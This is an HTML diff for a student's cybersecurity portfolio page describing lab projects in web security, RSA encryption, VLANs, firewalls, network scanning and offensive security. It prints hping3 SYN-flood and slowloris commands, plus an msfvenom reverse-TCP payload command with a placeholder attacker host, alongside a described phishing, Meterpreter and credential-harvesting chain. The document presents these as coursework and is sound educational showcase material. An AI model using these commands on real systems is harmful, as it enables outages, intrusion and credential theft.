+                                <svg width="14" height="14" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2"><path d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414A1 1 0 0119 7.414V19a2 2 0 01-2 2z"/></svg>
+                                Request Documentation<span class="link-arrow">→</span>
+                            </a>
+                            <a href="contact.html" class="project-link">
+                                <svg width="14" height="14" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2"><path d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4"/></svg>
+                                Ask for Source<span class="link-arrow">→</span>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </article>
+
+            <!-- PROJECT 02 -->
+            <article class="project-card" data-delay="100">
+                <span class="card-number">02 / PROJECT</span>
+                <div class="card-inner">
+                    <div class="card-left">
+                        <div class="card-header">
+                            <div class="card-icon" style="color:var(--red);background:rgba(255,0,85,0.1);">
+                                <svg width="22" height="22" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="1.5"><path stroke-linecap="round" stroke-linejoin="round" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9"/></svg>
+                            </div>
+                            <div class="card-meta">
+                                <div class="card-type" style="color:var(--red)">Web Security &amp; Development</div>
+                                <h2 class="card-title">Secure Web Application</h2>
+                                <div class="card-subtitle">Full-Stack Development &nbsp;·&nbsp; Spring 2025</div>
+                            </div>
+                        </div>
+                        <div class="card-image">
+                            <img src="https://images.unsplash.com/photo-1515879218367-8466d910aaa4?auto=format&fit=crop&fm=jpg&ixid=M3wxMjA3fDB8MHxzZWFyY2h8Mnx8Y29kaW5nJTIwc2NyZWVufGVufDB8fDB8fHww&ixlib=rb-4.1.0&q=60&w=3000" alt="Secure Web Application" loading="lazy">
+                            <div class="img-overlay-label">[VIEW DEMO]</div>
+                        </div>
+                        <div class="card-overview-label">Overview</div>
+                        <p class="card-desc">A security-focused full-stack web application featuring robust user authentication, comprehensive input validation, and hardened data handling. Built to implement OWASP security standards and prevent the most critical web application vulnerabilities.</p>
+                        <div class="card-overview-label">Security Features</div>
+                        <div class="achievements">
+                            <div class="achievement-item">Secure password hashing via bcrypt with proper salt rounds and key stretching</div>
+                            <div class="achievement-item">Full input validation and sanitization preventing XSS and SQL injection vectors</div>
+                            <div class="achievement-item">Session management with secure cookies, JWT auth, and CSRF protection</div>
+                            <div class="achievement-item">CORS policies, HSTS, CSP headers, and API rate limiting implemented</div>
+                        </div>
+                        <div class="card-overview-label" style="margin-top:2rem;">Stack</div>
+                        <div class="tech-tags">
+                            <span class="tech-tag">HTML/CSS</span><span class="tech-tag">JavaScript</span>
+                            <span class="tech-tag">Node.js</span><span class="tech-tag">Express.js</span>
+                            <span class="tech-tag">MySQL</span><span class="tech-tag">bcrypt</span>
+                        </div>
+                    </div>
+                    <div class="card-right">
+                        <div class="stats-block">
+                            <div class="stats-block-title">Security Metrics</div>
+                            <div class="stat-row"><span class="stat-label">Security Headers</span><span class="stat-value">7</span></div>
+                            <div class="stat-row"><span class="stat-label">Input Validations</span><span class="stat-value blue">15+</span></div>
+                            <div class="stat-row"><span class="stat-label">OWASP Tests</span><span class="stat-value ok">ALL PASS</span></div>
+                            <div class="stat-row"><span class="stat-label">Critical CVEs</span><span class="stat-value ok">0</span></div>
+                            <div class="stat-row"><span class="stat-label">Pen Test</span><span class="stat-value ok">CLEAN</span></div>
+                        </div>
+                        <div class="features-block">
+                            <div class="features-block-title">// Key Features</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>User Auth System</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>Secure API Endpoints</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>Data Encryption</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>Audit Logging</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>Role-Based Access Control</div>
+                        </div>
+                        <div class="links-block">
+                            <div class="links-block-title">// Resources</div>
+                            <a href="contact.html" class="project-link primary" style="border-color:var(--red);color:var(--red);background:rgba(255,0,85,0.08);">
+                                <svg width="14" height="14" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2"><path d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/><path d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/></svg>
+                                Request Demo Access<span class="link-arrow">→</span>
+                            </a>
+                            <a href="contact.html" class="project-link">
+                                <svg width="14" height="14" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="2"><path d="M10 20l4-16m4 4l4 4-4 4M6 16l-4-4 4-4"/></svg>
+                                Ask for Source<span class="link-arrow">→</span>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </article>
+
+            <!-- PROJECT 03 -->
+            <article class="project-card" data-delay="100">
+                <span class="card-number">03 / PROJECT</span>
+                <div class="card-inner">
+                    <div class="card-left">
+                        <div class="card-header">
+                            <div class="card-icon" style="color:var(--blue);background:rgba(0,170,255,0.1);border-color:rgba(0,170,255,0.2);">
+                                <svg width="22" height="22" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="1.5"><path stroke-linecap="round" stroke-linejoin="round" d="M15.75 5.25a3 3 0 013 3m3 0a6 6 0 01-7.029 5.912c-.563-.097-1.159.026-1.563.43L10.5 17.25H8.25v2.25H6v2.25H2.25v-2.818c0-.597.237-1.17.659-1.591l6.499-6.499c.404-.404.527-1 .43-1.563A6 6 0 1121.75 8.25z"/></svg>
+                            </div>
+                            <div class="card-meta">
+                                <div class="card-type" style="color:var(--blue)">Cryptography &amp; PKI</div>
+                                <h2 class="card-title">RSA Encrypted Email</h2>
+                                <div class="card-subtitle">OpenSSL · Windows Lab &nbsp;·&nbsp; 2025</div>
+                            </div>
+                        </div>
+                        <div class="card-image">
+                            <img src="https://images.unsplash.com/photo-1614064641938-3bbee52942c7?auto=format&fit=crop&fm=jpg&ixid=M3wxMjA3fDB8MHxzZWFyY2h8MTV8fGVtYWlsJTIwc2VjdXJpdHl8ZW58MHx8MHx8fDA%3D&ixlib=rb-4.1.0&q=60&w=3000" alt="RSA Encryption" loading="lazy">
+                            <div class="img-overlay-label">[KEY EXCHANGE]</div>
+                        </div>
+                        <div class="card-overview-label">Overview</div>
+                        <p class="card-desc">Implemented end-to-end RSA asymmetric encryption for secure email attachment transmission in a simulated enterprise environment. Enabled a sender to encrypt sensitive files with the recipient's public key so that only the recipient's private key could decrypt them — preventing exposure of credit card data in transit.</p>
+                        <div class="card-overview-label">Implementation Steps</div>
+                        <div class="achievements">
+                            <div class="achievement-item">Generated a 4096-bit RSA private key on ZYWIN01 using OpenSSL, stored securely at C:\Users\Pasha\privateKey</div>
+                            <div class="achievement-item">Derived and exported RSA public key, then distributed it via internal email to the sending party</div>
+                            <div class="achievement-item">Encrypted creditCardInfo.txt on ZYWIN02 using the public key with OpenSSL rsautl, producing an encrypted output file</div>
+                            <div class="achievement-item">Emailed the encrypted attachment; decrypted on ZYWIN01 using the paired private key — original plaintext fully recovered</div>
+                        </div>
+                        <div class="card-overview-label" style="margin-top:2rem;">Stack</div>
+                        <div class="tech-tags">
+                            <span class="tech-tag">OpenSSL</span><span class="tech-tag">RSA-4096</span>
+                            <span class="tech-tag">Windows</span><span class="tech-tag">PKI</span>
+                            <span class="tech-tag">Asymmetric Crypto</span><span class="tech-tag">CMD</span>
+                        </div>
+                    </div>
+                    <div class="card-right">
+                        <div class="stats-block">
+                            <div class="stats-block-title">Crypto Metrics</div>
+                            <div class="stat-row"><span class="stat-label">Key Size</span><span class="stat-value blue">4096-bit</span></div>
+                            <div class="stat-row"><span class="stat-label">Algorithm</span><span class="stat-value">RSA</span></div>
+                            <div class="stat-row"><span class="stat-label">Machines Used</span><span class="stat-value blue">2</span></div>
+                            <div class="stat-row"><span class="stat-label">Data Integrity</span><span class="stat-value ok">VERIFIED</span></div>
+                            <div class="stat-row"><span class="stat-label">Decryption</span><span class="stat-value ok">SUCCESS</span></div>
+                        </div>
+                        <div class="command-block">
+                            <div class="command-block-title">OpenSSL Commands</div>
+                            <div class="cmd-line"><span class="prompt">$</span><span><span class="cmd-text">openssl rsautl </span><span class="cmd-flag">-encrypt</span><span class="cmd-text"> -pubin </span><span class="cmd-flag">-inkey</span><span class="cmd-path"> publicKey.pem</span><span class="cmd-flag"> -in</span><span class="cmd-path"> creditCardInfo.txt</span><span class="cmd-flag"> -out</span><span class="cmd-path"> encrypted.txt</span></span></div>
+                            <div class="cmd-spacer"></div>
+                            <div class="cmd-line"><span class="prompt">$</span><span><span class="cmd-text">openssl rsautl </span><span class="cmd-flag">-decrypt</span><span class="cmd-flag"> -inkey</span><span class="cmd-path"> privateKey</span><span class="cmd-flag"> -in</span><span class="cmd-path"> encrypted.txt</span><span class="cmd-flag"> -out</span><span class="cmd-path"> decrypted.txt</span></span></div>
+                        </div>
+                        <div class="features-block">
+                            <div class="features-block-title">// Key Concepts</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>Asymmetric Key Generation</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>Public Key Distribution</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>File Encryption (RSA)</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>Secure Decryption</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>Data-in-Transit Protection</div>
+                        </div>
+                    </div>
+                </div>
+            </article>
+
+            <!-- PROJECT 04 -->
+            <article class="project-card" data-delay="100">
+                <span class="card-number">04 / PROJECT</span>
+                <div class="card-inner">
+                    <div class="card-left">
+                        <div class="card-header">
+                            <div class="card-icon" style="color:var(--orange);background:rgba(255,140,0,0.1);border-color:rgba(255,140,0,0.2);">
+                                <svg width="22" height="22" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="1.5"><path stroke-linecap="round" stroke-linejoin="round" d="M7.5 21L3 16.5m0 0L7.5 12M3 16.5h13.5m0-13.5L21 7.5m0 0L16.5 12M21 7.5H7.5"/></svg>
+                            </div>
+                            <div class="card-meta">
+                                <div class="card-type" style="color:var(--orange)">Network Segmentation</div>
+                                <h2 class="card-title">VLAN &amp; Subnetting Lab</h2>
+                                <div class="card-subtitle">Cisco Packet Tracer &nbsp;·&nbsp; 2025</div>
+                            </div>
+                        </div>
+                        <div class="card-image">
+                            <img src="https://images.unsplash.com/photo-1691435828932-911a7801adfb?auto=format&fit=crop&fm=jpg&ixid=M3wxMjA3fDB8MHxzZWFyY2h8M3x8bmV0d29yayUyMHNlY3VyaXR5fGVufDB8fDB8fHww&ixlib=rb-4.1.0&q=60&w=3000" alt="VLAN Network Segmentation" loading="lazy">
+                            <div class="img-overlay-label">[NETWORK DIAGRAM]</div>
+                        </div>
+                        <div class="card-overview-label">Overview</div>
+                        <p class="card-desc">Designed and implemented network segmentation for a simulated school environment (ABC High School) using VLANs to isolate academic and administrative traffic. Extended the design with a four-subnet architecture derived from a /24 address space to enforce security boundaries between labs, offices, and administration.</p>
+                        <div class="card-overview-label">Achievements</div>
+                        <div class="achievements">
+                            <div class="achievement-item">Configured VLAN 2 (academic) and VLAN 3 (administrative) on LabSwitch and OfficeSwitch with proper access-mode port assignments</div>
+                            <div class="achievement-item">Assigned static IPv4 addressing across all PCs with correct subnet masks and gateway configuration</div>
+                            <div class="achievement-item">Created a four-subnet table from 192.168.1.0/24, calculating network addresses, usable host ranges, and broadcast addresses for each subnet</div>
+                            <div class="achievement-item">Connected all devices across two switches via inter-VLAN routing through router r1, validating end-to-end segmentation</div>
+                        </div>
+                        <div class="card-overview-label" style="margin-top:2rem;">Stack</div>
+                        <div class="tech-tags">
+                            <span class="tech-tag">Cisco Packet Tracer</span><span class="tech-tag">VLANs</span>
+                            <span class="tech-tag">Subnetting</span><span class="tech-tag">IPv4</span>
+                            <span class="tech-tag">Inter-VLAN Routing</span><span class="tech-tag">Layer 2</span>
+                        </div>
+                    </div>
+                    <div class="card-right">
+                        <div class="stats-block">
+                            <div class="stats-block-title">Network Stats</div>
+                            <div class="stat-row"><span class="stat-label">VLANs Configured</span><span class="stat-value orange">2</span></div>
+                            <div class="stat-row"><span class="stat-label">Subnets Created</span><span class="stat-value">4</span></div>
+                            <div class="stat-row"><span class="stat-label">PCs Configured</span><span class="stat-value blue">4</span></div>
+                            <div class="stat-row"><span class="stat-label">Switches</span><span class="stat-value blue">2</span></div>
+                            <div class="stat-row"><span class="stat-label">Segmentation</span><span class="stat-value ok">VERIFIED</span></div>
+                        </div>
+                        <div class="features-block">
+                            <div class="features-block-title">// Key Concepts</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>VLAN Access Port Config</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>Inter-VLAN Routing</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>Subnet Table Design</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>IPv4 Static Addressing</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>Network Isolation</div>
+                        </div>
+                        <div class="command-block">
+                            <div class="command-block-title">Subnet Table (/24 → 4 subnets)</div>
+                            <div class="cmd-line"><span class="prompt">#</span><span><span class="cmd-path">192.168.1.0/26</span><span class="cmd-text"> — hosts .1–.62</span></span></div>
+                            <div class="cmd-line"><span class="prompt">#</span><span><span class="cmd-path">192.168.1.64/26</span><span class="cmd-text"> — hosts .65–.126</span></span></div>
+                            <div class="cmd-line"><span class="prompt">#</span><span><span class="cmd-path">192.168.1.128/26</span><span class="cmd-text"> — hosts .129–.190</span></span></div>
+                            <div class="cmd-line"><span class="prompt">#</span><span><span class="cmd-path">192.168.1.192/26</span><span class="cmd-text"> — hosts .193–.254</span></span></div>
+                        </div>
+                    </div>
+                </div>
+            </article>
+
+            <!-- PROJECT 05 -->
+            <article class="project-card" data-delay="100">
+                <span class="card-number">05 / PROJECT</span>
+                <div class="card-inner">
+                    <div class="card-left">
+                        <div class="card-header">
+                            <div class="card-icon" style="color:var(--red);background:rgba(255,0,85,0.1);border-color:rgba(255,0,85,0.2);">
+                                <svg width="22" height="22" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="1.5"><path stroke-linecap="round" stroke-linejoin="round" d="M3.75 13.5l10.5-11.25L12 10.5h8.25L9.75 21.75 12 13.5H3.75z"/></svg>
+                            </div>
+                            <div class="card-meta">
+                                <div class="card-type" style="color:var(--red)">Offensive Security</div>
+                                <h2 class="card-title">DoS Attack Simulation</h2>
+                                <div class="card-subtitle">hping3 · Slowloris · Wireshark &nbsp;·&nbsp; 2025</div>
+                            </div>
+                        </div>
+                        <div class="card-image">
+                            <img src="https://images.unsplash.com/photo-1562813733-b31f71025d54?auto=format&fit=crop&fm=jpg&ixid=M3wxMjA3fDB8MHxzZWFyY2h8Nnx8aGFja2VyfGVufDB8fDB8fHww&ixlib=rb-4.1.0&q=60&w=3000" alt="DoS Attack Analysis" loading="lazy">
+                            <div class="img-overlay-label">[TRAFFIC ANALYSIS]</div>
+                        </div>
+                        <div class="card-overview-label">Overview</div>
+                        <p class="card-desc">Executed and analyzed multiple categories of Denial-of-Service attacks across three OSI layers in a controlled virtual lab environment. Used hping3 to craft and send malformed TCP, ICMP, and UDP packets, and Slowloris to perform application-layer exhaustion — capturing all traffic in Wireshark for analysis.</p>
+                        <div class="card-overview-label">Attack Vectors Demonstrated</div>
+                        <div class="achievements">
+                            <div class="achievement-item">TCP SYN flood (Layer 4) — exhausted server connection table by sending high-volume SYN packets without completing handshakes</div>
+                            <div class="achievement-item">Ping of Death &amp; ICMP flood (Layer 3) — sent oversized and high-rate ICMP packets to saturate target bandwidth</div>
+                            <div class="achievement-item">UDP flood (Layer 3) — generated continuous UDP traffic to exhaust network bandwidth measured in Bps</div>
+                            <div class="achievement-item">Slowloris HTTP flood (Layer 7) — held open HTTP connections to exhaust web server thread pool without high bandwidth usage</div>
+                        </div>
+                        <div class="card-overview-label" style="margin-top:2rem;">Stack</div>
+                        <div class="tech-tags">
+                            <span class="tech-tag">hping3</span><span class="tech-tag">Slowloris</span>
+                            <span class="tech-tag">Wireshark</span><span class="tech-tag">Kali Linux</span>
+                            <span class="tech-tag">Windows Server</span><span class="tech-tag">Task Manager</span>
+                        </div>
+                    </div>
+                    <div class="card-right">
+                        <div class="stats-block">
+                            <div class="stats-block-title">Attack Coverage</div>
+                            <div class="stat-row"><span class="stat-label">OSI Layers Covered</span><span class="stat-value red">3, 4, 7</span></div>
+                            <div class="stat-row"><span class="stat-label">Attack Types</span><span class="stat-value red">5</span></div>
+                            <div class="stat-row"><span class="stat-label">Tools Used</span><span class="stat-value blue">3</span></div>
+                            <div class="stat-row"><span class="stat-label">Traffic Captured</span><span class="stat-value ok">YES</span></div>
+                            <div class="stat-row"><span class="stat-label">Environment</span><span class="stat-value ok">ISOLATED</span></div>
+                        </div>
+                        <div class="features-block">
+                            <div class="features-block-title">// Attack Types</div>
+                            <div class="feature-item"><div class="feature-check" style="border-color:var(--red);color:var(--red);">✓</div>TCP SYN Flood</div>
+                            <div class="feature-item"><div class="feature-check" style="border-color:var(--red);color:var(--red);">✓</div>Ping of Death</div>
+                            <div class="feature-item"><div class="feature-check" style="border-color:var(--red);color:var(--red);">✓</div>ICMP Flood</div>
+                            <div class="feature-item"><div class="feature-check" style="border-color:var(--red);color:var(--red);">✓</div>UDP Flood</div>
+                            <div class="feature-item"><div class="feature-check" style="border-color:var(--red);color:var(--red);">✓</div>Slowloris HTTP Flood</div>
+                        </div>
+                        <div class="command-block">
+                            <div class="command-block-title">Sample Commands</div>
+                            <div class="cmd-line"><span class="prompt">$</span><span><span class="cmd-text">hping3 </span><span class="cmd-flag">-S</span><span class="cmd-flag"> --flood</span><span class="cmd-flag"> -V</span><span class="cmd-flag"> -p</span><span class="cmd-path"> 80</span><span class="cmd-text"> [target]</span></span></div>
+                            <div class="cmd-spacer"></div>
+                            <div class="cmd-line"><span class="prompt">$</span><span><span class="cmd-text">slowloris </span><span class="cmd-path">[target]</span><span class="cmd-flag"> -p 80</span><span class="cmd-flag"> -s 500</span></span></div>
+                        </div>
+                    </div>
+                </div>
+            </article>
+
+            <!-- PROJECT 06 -->
+            <article class="project-card" data-delay="100">
+                <span class="card-number">06 / PROJECT</span>
+                <div class="card-inner">
+                    <div class="card-left">
+                        <div class="card-header">
+                            <div class="card-icon" style="color:var(--green);background:var(--green-glow);">
+                                <svg width="22" height="22" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="1.5"><path stroke-linecap="round" stroke-linejoin="round" d="M3.75 3.75v4.5m0-4.5h4.5m-4.5 0L9 9M3.75 20.25v-4.5m0 4.5h4.5m-4.5 0L9 15M20.25 3.75h-4.5m4.5 0v4.5m0-4.5L15 9m5.25 11.25h-4.5m4.5 0v-4.5m0 4.5L15 15"/></svg>
+                            </div>
+                            <div class="card-meta">
+                                <div class="card-type">Firewall Configuration</div>
+                                <h2 class="card-title">Windows Firewall Hardening</h2>
+                                <div class="card-subtitle">Windows Server 2022 &nbsp;·&nbsp; 2025</div>
+                            </div>
+                        </div>
+                        <div class="card-image">
+                            <img src="https://images.unsplash.com/photo-1563986768609-322da13575f3?ixlib=rb-4.0.3&auto=format&fit=crop&w=1400&q=80" alt="Firewall Configuration" loading="lazy">
+                            <div class="img-overlay-label">[RULE CONFIGURATION]</div>
+                        </div>
+                        <div class="card-overview-label">Overview</div>
+                        <p class="card-desc">Completed a series of increasingly complex Windows Defender Firewall labs — from basic rule configuration to a full security audit scenario for a simulated startup (ABC Tech). Applied the principle of least privilege by selectively allowing only necessary protocols while blocking all unnecessary inbound and outbound traffic vectors.</p>
+                        <div class="card-overview-label">Achievements</div>
+                        <div class="achievements">
+                            <div class="achievement-item">Configured inbound and outbound rules blocking ICMPv4, L2TP, Telnet, SMB, and RDP while allowing HTTP, HTTPS, FTP, and SSH</div>
+                            <div class="achievement-item">Used nmap to scan for open ports before and after rule implementation to verify firewall effectiveness</div>
+                            <div class="achievement-item">Blocked SMB file sharing (EternalBlue attack surface) and modified existing rules to enforce traffic restrictions</div>
+                            <div class="achievement-item">Configured outbound rules blocking unencrypted SMTP and TFTP while allowing secure SMTP for encrypted email flow</div>
+                        </div>
+                        <div class="card-overview-label" style="margin-top:2rem;">Stack</div>
+                        <div class="tech-tags">
+                            <span class="tech-tag">Windows Defender Firewall</span><span class="tech-tag">Nmap</span>
+                            <span class="tech-tag">Windows Server 2022</span><span class="tech-tag">CMD</span>
+                            <span class="tech-tag">SMB</span><span class="tech-tag">RDP</span>
+                        </div>
+                    </div>
+                    <div class="card-right">
+                        <div class="stats-block">
+                            <div class="stats-block-title">Rule Summary</div>
+                            <div class="stat-row"><span class="stat-label">Inbound Rules Created</span><span class="stat-value">8</span></div>
+                            <div class="stat-row"><span class="stat-label">Outbound Rules Created</span><span class="stat-value blue">3</span></div>
+                            <div class="stat-row"><span class="stat-label">Protocols Blocked</span><span class="stat-value red">6</span></div>
+                            <div class="stat-row"><span class="stat-label">Protocols Allowed</span><span class="stat-value ok">4</span></div>
+                            <div class="stat-row"><span class="stat-label">Nmap Verification</span><span class="stat-value ok">PASS</span></div>
+                        </div>
+                        <div class="features-block">
+                            <div class="features-block-title">// Protocols Hardened</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>ICMP — Blocked (recon prevention)</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>SMB — Blocked (EternalBlue surface)</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>RDP — Blocked (brute force vector)</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>Telnet — Blocked (plaintext)</div>
+                            <div class="feature-item"><div class="feature-check">✓</div>HTTPS / SSH — Allowed</div>
+                        </div>
+                        <div class="command-block">
+                            <div class="command-block-title">Nmap Verification</div>
+                            <div class="cmd-line"><span class="prompt">$</span><span><span class="cmd-text">nmap </span><span class="cmd-flag">-sS</span><span class="cmd-flag"> -p 1-65535</span><span class="cmd-path"> [target]</span></span></div>
+                            <div class="cmd-spacer"></div>
+                            <div class="cmd-line"><span class="prompt">$</span><span><span class="cmd-text">nmap </span><span class="cmd-flag">-sV</span><span class="cmd-flag"> -O</span><span class="cmd-path"> [target]</span></span></div>
+                        </div>
+                    </div>
+                </div>
+            </article>
+
+            <!-- PROJECT 07 -->
+            <article class="project-card" data-delay="100">
+                <span class="card-number">07 / PROJECT</span>
+                <div class="card-inner">
+                    <div class="card-left">
+                        <div class="card-header">
+                            <div class="card-icon" style="color:var(--red);background:rgba(255,0,85,0.1);border-color:rgba(255,0,85,0.2);">
+                                <svg width="22" height="22" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="1.5"><path stroke-linecap="round" stroke-linejoin="round" d="M12 12.75c1.148 0 2.278.08 3.383.237 1.037.146 1.866.966 1.866 2.013 0 3.728-2.35 6.75-5.25 6.75S6.75 18.728 6.75 15c0-1.046.83-1.867 1.866-2.013A24.204 24.204 0 0112 12.75zm0 0c2.883 0 5.647.508 8.207 1.44a23.91 23.91 0 01-1.152 6.06M12 12.75c-2.883 0-5.647.508-8.208 1.44a23.916 23.916 0 001.153 6.06M12 12.75a2.25 2.25 0 002.248-2.354M12 12.75a2.25 2.25 0 01-2.248-2.354M12 8.25c.995 0 1.971-.08 2.922-.236.403-.066.74-.358.795-.762a3.778 3.778 0 00-.399-2.25M12 8.25c-.995 0-1.97-.08-2.921-.236-.403-.066-.74-.358-.795-.762a3.774 3.774 0 01.4-2.253M12 8.25a2.25 2.25 0 00-2.248 2.146M12 8.25a2.25 2.25 0 012.248 2.146M8.683 5a6.032 6.032 0 01-1.155-1.002c.07-.63.27-1.222.574-1.747m.581 2.749A3.75 3.75 0 0115.318 5m0 0c.427-.283.815-.62 1.155-.999a4.471 4.471 0 00-.575-1.752M4.921 6a24.048 24.048 0 00-.392 3.314c1.668.546 3.416.914 5.223 1.082M19.08 6c.205 1.08.337 2.187.392 3.314a23.882 23.882 0 01-5.223 1.082"/></svg>
+                            </div>
+                            <div class="card-meta">
+                                <div class="card-type" style="color:var(--red)">Offensive Security</div>
+                                <h2 class="card-title">Malware &amp; Credential Harvesting</h2>
+                                <div class="card-subtitle">Metasploit · SET · Kali Linux &nbsp;·&nbsp; 2025</div>
+                            </div>
+                        </div>
+                        <div class="card-image">
+                            <img src="https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?ixlib=rb-4.0.3&auto=format&fit=crop&w=1400&q=80" alt="Offensive Security" loading="lazy">
+                            <div class="img-overlay-label">[CONTROLLED LAB ONLY]</div>
+                        </div>
+                        <div class="card-overview-label">Overview</div>
+                        <p class="card-desc">Executed a full offensive security chain in a controlled virtual lab: from generating reverse TCP shellcode payloads with MSFvenom, to delivering them via phishing emails, to opening Meterpreter shells on compromised systems. Extended with credential harvesting by cloning a legitimate website using the Social Engineering Toolkit (SET) to capture submitted credentials.</p>
+                        <div class="card-overview-label">Attack Chain Steps</div>
+                        <div class="achievements">
+                            <div class="achievement-item">Generated a Windows reverse TCP shellcode executable using MSFvenom and configured a Metasploit listener on Kali Linux</div>
+                            <div class="achievement-item">Crafted and sent a phishing email containing the malicious payload; executed on Windows Server 2022 target machine</div>
+                            <div class="achievement-item">Opened a Meterpreter shell on the compromised machine and exfiltrated confidential files remotely</div>
+                            <div class="achievement-item">Cloned a legitimate login page using SET's Credential Harvester, sent phishing link, and captured submitted usernames and passwords</div>
+                        </div>
+                        <div class="card-overview-label" style="margin-top:2rem;">Stack</div>
+                        <div class="tech-tags">
+                            <span class="tech-tag">Metasploit</span><span class="tech-tag">MSFvenom</span>
+                            <span class="tech-tag">Meterpreter</span><span class="tech-tag">SET</span>
+                            <span class="tech-tag">Kali Linux</span><span class="tech-tag">Windows Server 2022</span>
+                        </div>
+                    </div>
+                    <div class="card-right">
+                        <div class="stats-block">
+                            <div class="stats-block-title">Attack Chain Metrics</div>
+                            <div class="stat-row"><span class="stat-label">Payload Type</span><span class="stat-value red">Reverse TCP</span></div>
+                            <div class="stat-row"><span class="stat-label">Shell Access</span><span class="stat-value red">Meterpreter</span></div>
+                            <div class="stat-row"><span class="stat-label">Delivery Vector</span><span class="stat-value orange">Phishing</span></div>
+                            <div class="stat-row"><span class="stat-label">Creds Captured</span><span class="stat-value ok">YES</span></div>
+                            <div class="stat-row"><span class="stat-label">Environment</span><span class="stat-value ok">ISOLATED</span></div>
+                        </div>
+                        <div class="features-block">
+                            <div class="features-block-title">// Techniques Covered</div>
+                            <div class="feature-item"><div class="feature-check" style="border-color:var(--red);color:var(--red);">✓</div>Payload Generation (MSFvenom)</div>
+                            <div class="feature-item"><div class="feature-check" style="border-color:var(--red);color:var(--red);">✓</div>Listener Configuration (MSF)</div>
+                            <div class="feature-item"><div class="feature-check" style="border-color:var(--red);color:var(--red);">✓</div>Email Phishing Delivery</div>
+                            <div class="feature-item"><div class="feature-check" style="border-color:var(--red);color:var(--red);">✓</div>Remote Shell (Meterpreter)</div>
+                            <div class="feature-item"><div class="feature-check" style="border-color:var(--red);color:var(--red);">✓</div>Website Cloning (SET)</div>
+                        </div>
+                        <div class="command-block">
+                            <div class="command-block-title">MSFvenom Payload</div>
+                            <div class="cmd-line"><span class="prompt">$</span><span><span class="cmd-text">msfvenom </span><span class="cmd-flag">-p</span><span class="cmd-path"> windows/meterpreter/reverse_tcp</span><span class="cmd-flag"> LHOST=</span><span class="cmd-path">[attacker]</span><span class="cmd-flag"> LPORT=</span><span class="cmd-path">4444</span><span class="cmd-flag"> -f exe -o</span><span class="cmd-path"> payload.exe</span></span></div>
+                        </div>
+                    </div>
+                </div>
+            </article>
+
+            <!-- PROJECT 08 -->
+            <article class="project-card" data-delay="100">
+                <span class="card-number">08 / PROJECT</span>
+                <div class="card-inner">
+                    <div class="card-left">
+                        <div class="card-header">
+                            <div class="card-icon" style="color:var(--blue);background:rgba(0,170,255,0.1);border-color:rgba(0,170,255,0.2);">
+                                <svg width="22" height="22" fill="none" stroke="currentColor" viewBox="0 0 24 24" stroke-width="1.5"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"/></svg>
+                            </div>
+                            <div class="card-meta">
+                                <div class="card-type" style="color:var(--blue)">Reconnaissance &amp; Audit</div>
+                                <h2 class="card-title">Network Enumeration &amp; Security Audit</h2>
+                                <div class="card-subtitle">arp-scan · hping3 · nmap &nbsp;·&nbsp; 2025</div>
+                            </div>
+                        </div>
+                        <div class="card-image">
+                            <img src="https://images.unsplash.com/photo-1520869562399-e772f042f422?ixlib=rb-4.0.3&auto=format&fit=crop&w=1400&q=80" alt="Network Enumeration" loading="lazy">
+                            <div class="img-overlay-label">[SCAN RESULTS]</div>
+                        </div>
+                        <div class="card-overview-label">Overview</div>
+                        <p class="card-desc">Performed comprehensive network enumeration and a full security audit for a simulated organization (ABC Tech) using industry-standard recon tools. Enumerated active devices via ARP scanning, profiled open ports and services using TCP SYN scans and service version detection, and identified operating systems across Windows and Linux targets.</p>
+                        <div class="card-overview-label">Achievements</div>
+                        <div class="achievements">
+                            <div class="achievement-item">Used arp-scan to discover all active hosts on the network and retrieve their MAC and IP addresses</div>
+                            <div class="achievement-item">Performed full-port TCP SYN scans (ports 1–65535) on Windows Server 2022, Debian, and CentOS targets using hping3 and nmap</div>
+                            <div class="achievement-item">Detected service software versions with nmap -sV to profile running applications and identify potential vulnerabilities</div>
+                            <div class="achievement-item">Conducted OS fingerprinting with nmap -O across all three targets to identify legacy operating systems as part of the audit</div>
+                        </div>
